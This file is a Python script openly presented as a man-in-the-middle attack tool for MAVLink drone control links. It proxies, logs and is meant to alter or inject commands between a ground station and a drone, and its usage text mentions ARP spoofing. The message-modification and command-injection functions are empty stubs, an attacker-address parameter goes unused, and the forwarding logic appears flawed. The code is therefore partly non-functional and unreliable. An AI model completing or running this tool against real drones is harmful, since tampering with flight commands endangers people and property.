#!/usr/bin/env python3
"""
MAVLink Man-in-the-Middle (MITM) Attack Script
Intercepts and modifies MAVLink communication between GCS and drone
"""

import sys
import socket
import threading
import time
from pymavlink import mavutil
from pymavlink.dialects.v20 import common as mavlink2

class MAVLinkMITM:
    def __init__(self, gcs_address, drone_address, attacker_address):
        """
        Initialize MITM proxy
        
        Args:
            gcs_address: GCS connection string (e.g., 'udp:127.0.0.1:14550')
            drone_address: Drone connection string
            attacker_address: Attacker's connection string
        """
        self.gcs_address = gcs_address
        self.drone_address = drone_address
        self.attacker_address = attacker_address
        self.running = False
        self.message_log = []
        self.modified_messages = []
    
    def parse_connection_string(self, conn_str):
        """Parse MAVLink connection string"""
        if ':' in conn_str:
            protocol, address = conn_str.split(':', 1)
            if '@' in address:
                address, port = address.split('@')
            else:
                if protocol == 'udp':
                    parts = address.split(':')
                    if len(parts) == 2:
                        address, port = parts
                    else:
                        address = parts[0]
                        port = '14550'
                else:
                    address = address
                    port = '5760'
            return protocol, address, int(port)
        return None, None, None
    
    def start_mitm(self):
        """Start MITM proxy"""
        print("[*] Starting MAVLink MITM proxy...")
        print(f"[*] GCS: {self.gcs_address}")
        print(f"[*] Drone: {self.drone_address}")
        
        # Parse addresses
        gcs_proto, gcs_addr, gcs_port = self.parse_connection_string(self.gcs_address)
        drone_proto, drone_addr, drone_port = self.parse_connection_string(self.drone_address)
        
        if gcs_proto != 'udp' or drone_proto != 'udp':
            print("[-] Only UDP connections supported for MITM")
            return False
        
        self.running = True
        
        # Create UDP sockets
        gcs_sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        drone_sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        
        # Bind to local ports
        local_gcs_port = gcs_port + 1000
        local_drone_port = drone_port + 1000
        
        gcs_sock.bind(('127.0.0.1', local_gcs_port))
        drone_sock.bind(('127.0.0.1', local_drone_port))
        
        print(f"[*] Listening on ports {local_gcs_port} (GCS) and {local_drone_port} (Drone)")
        
        # Start forwarding threads
        gcs_thread = threading.Thread(
            target=self.forward_messages,
            args=(gcs_sock, (drone_addr, drone_port), 'GCS->Drone')
        )
        drone_thread = threading.Thread(
            target=self.forward_messages,
            args=(drone_sock, (gcs_addr, gcs_port), 'Drone->GCS')
        )
        
        gcs_thread.start()
        drone_thread.start()
        
        print("[+] MITM proxy running (Press Ctrl+C to stop)...")
        
        try:
            gcs_thread.join()
            drone_thread.join()
        except KeyboardInterrupt:
            print("\n[*] Stopping MITM proxy...")
            self.running = False
        
        gcs_sock.close()
        drone_sock.close()
        
        return True
    
    def forward_messages(self, sock, target_addr, direction):
        """Forward messages with optional modification"""
        while self.running:
            try:
                sock.settimeout(1.0)
                data, addr = sock.recvfrom(4096)
                
                # Log message
                self.message_log.append({
                    'direction': direction,
                    'timestamp': time.time(),
                    'data': data.hex()
                })
                
                # Modify messages (example: modify commands)
                modified_data = self.modify_message(data, direction)
                
                if modified_data != data:
                    self.modified_messages.append({
                        'direction': direction,
                        'original': data.hex(),
                        'modified': modified_data.hex()
                    })
                    print(f"[!] Modified {direction} message")
                
                # Forward to target
                sock.sendto(modified_data, target_addr)
                
            except socket.timeout:
                continue
            except Exception as e:
                if self.running:
                    print(f"[-] Error in {direction}: {e}")
    
    def modify_message(self, data, direction):
        """
        Modify MAVLink message
        
        Args:
            data: Raw message data
            direction: Message direction
        
        Returns:
            Modified message data
        """
        # Example: Modify commands from GCS to drone
        if direction == 'GCS->Drone':
            # Try to parse as MAVLink message
            try:
                # Check if it's a command message
                if len(data) > 0:
                    # MAVLink 2.0 magic byte is 0xfd
                    if data[0] == 0xfd:
                        # This is a simplified modification
                        # Real implementation would parse MAVLink structure
                        # and modify specific fields
                        pass
            except:
                pass
        
        return data
    
    def inject_command(self, command_type, params):
        """Inject malicious command into stream"""
        print(f"[*] Injecting command: {command_type}")
        # Implementation would create MAVLink message and inject it
        pass

def main():
    if len(sys.argv) < 3:
        print("Usage: python3 mavlink_mitm.py <gcs_connection> <drone_connection>")
        print("Example: python3 mavlink_mitm.py udp:127.0.0.1:14550 udp:10.13.0.2:14550")
        print("\nThis script creates a MITM proxy that:")
        print("  1. Intercepts MAVLink communication")
        print("  2. Logs all messages")
        print("  3. Allows modification of messages in transit")
        print("  4. Forwards messages between GCS and drone")
        print("\nWARNING: Requires network access and may need ARP spoofing")
        sys.exit(1)
    
    gcs_connection = sys.argv[1]
    drone_connection = sys.argv[2]
    
    # Validate connection strings
    if not gcs_connection or not (gcs_connection.startswith('udp:') or gcs_connection.startswith('tcp:')):
        print(f"[-] Invalid GCS connection string: {gcs_connection}")
        print("[*] Expected format: udp:IP:PORT or tcp:IP:PORT")
        sys.exit(1)
    
    if not drone_connection or not (drone_connection.startswith('udp:') or drone_connection.startswith('tcp:')):
        print(f"[-] Invalid drone connection string: {drone_connection}")
        print("[*] Expected format: udp:IP:PORT or tcp:IP:PORT")
        sys.exit(1)
    
    mitm = MAVLinkMITM(gcs_connection, drone_connection, None)
    mitm.start_mitm()
    
    # Display summary
    print(f"\n[+] MITM session complete")
    print(f"[+] Messages intercepted: {len(mitm.message_log)}")
    print(f"[+] Messages modified: {len(mitm.modified_messages)}")

if __name__ == "__main__":
    main()
